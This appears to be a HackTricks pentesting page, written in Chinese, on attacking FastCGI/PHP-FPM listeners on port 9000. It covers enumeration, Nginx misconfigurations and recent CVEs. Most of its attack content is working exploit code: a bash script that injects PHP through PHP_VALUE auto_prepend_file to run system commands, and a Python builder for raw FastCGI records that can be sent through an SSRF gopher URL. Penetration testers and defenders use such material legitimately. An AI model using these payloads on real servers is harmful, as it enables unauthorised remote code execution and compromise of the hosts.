# 9000 Pentesting FastCGI

{{#include ../banners/hacktricks-training.md}}

## 基本信息

如果你想了解什么是 FastCGI，请查看以下页面：


{{#ref}}
pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.md
{{#endref}}

默认情况下 FastCGI 在端口 9000 运行，nmap 无法识别。通常 FastCGI 仅在 localhost 上侦听。

## 枚举 / 快速检查

* **端口扫描：** `nmap -sV -p9000 <target>`（通常会显示 "unknown" 服务；需要手动验证）。
* **探测 FPM 状态页面：** `SCRIPT_FILENAME=/status SCRIPT_NAME=/status REQUEST_METHOD=GET cgi-fcgi -bind -connect 127.0.0.1:9000`（默认 php-fpm 的 `pm.status_path`）。
* **通过 SSRF 查找可达 socket：** 如果某个 HTTP 服务可被 SSRF 利用，尝试使用 `gopher://127.0.0.1:9000/_...` 有效负载触达 FastCGI 侦听器。
* **Nginx 配置错误：** 在存在 `fastcgi_split_path_info` 错误并且 `cgi.fix_pathinfo=1` 的情况下，你可以在静态文件后追加 `/.php` 来触达 PHP（通过遍历实现代码执行）。

## RCE

让 FastCGI 执行任意代码相对容易：

<details>
<summary>Send FastCGI request that prepends PHP payload</summary>
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
OUTPUT=$(mktemp)
env -i \
PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

cat $OUTPUT
done
```
</details>

或者你也可以使用以下 python 脚本: [https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

### SSRF/gopher 到 FastCGI（当 9000 无法直接访问时）

如果你只能控制一个 **SSRF** primitive，你仍然可以使用 gopher scheme 命中 FastCGI 并 craft 一个完整的 FastCGI request。示例 payload 构建器：

<details>
<summary>构建并发送 gopher FastCGI RCE payload</summary>
```python
import struct, socket
host, port = "127.0.0.1", 9000
params = {
b"REQUEST_METHOD": b"POST",
b"SCRIPT_FILENAME": b"/var/www/html/index.php",
b"PHP_VALUE": b"auto_prepend_file=php://input\nallow_url_include=1"
}
body = b"<?php system('id'); ?>"

def rec(rec_type, content, req_id=1):
return struct.pack("!BBHHBB", 1, rec_type, req_id, len(content), 0, 0) + content

def enc_params(d):
out = b""
for k, v in d.items():
out += struct.pack("!B", len(k)) + struct.pack("!B", len(v)) + k + v
return out
payload  = rec(4, enc_params(params)) + rec(4, b"")  # FCGI_PARAMS + terminator
payload += rec(5, body)                                # FCGI_STDIN

s = socket.create_connection((host, port))
s.sendall(payload)
print(s.recv(4096))
```
将 `payload` 转为 URL-safe base64/percent-encoding，并在你的 SSRF 中通过 `gopher://host:9000/_<payload>` 发送。
</details>

### 关于近期问题的说明

* **libfcgi <= 2.4.4 integer overflow (2024):** 精心构造的 `nameLen`/`valueLen` 在 FastCGI 记录中可能在 32‑bit builds（常见于 embedded/IoT）上发生溢出，当 FastCGI socket 可达（直接或通过 SSRF）时会导致 heap RCE。
* **PHP-FPM log manipulation (CVE-2024-9026):** 当 `catch_workers_output = yes` 时，能够发送 FastCGI 请求的攻击者可能会截断或注入每行日志最多 4 字节，以擦除迹象或投毒日志。
* **Classic Nginx + cgi.fix_pathinfo misconfig:** 仍然广泛存在；如果在未进行文件存在检查的情况下使用 `fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;`，任何以 `.php` 结尾的路径都会被执行，从而可能启用 path traversal 或 source overwrite 风格的 gadgets。

## References

* [FastCGI library integer overflow leading to RCE](https://cybersecuritynews.com/fastcgi-integer-overflow-flaw/)
* [CVE-2024-9026 PHP-FPM log manipulation analysis](https://cyrisk.com/security/cve-2024-9026-log-manipulation/)
{{#include ../banners/hacktricks-training.md}}
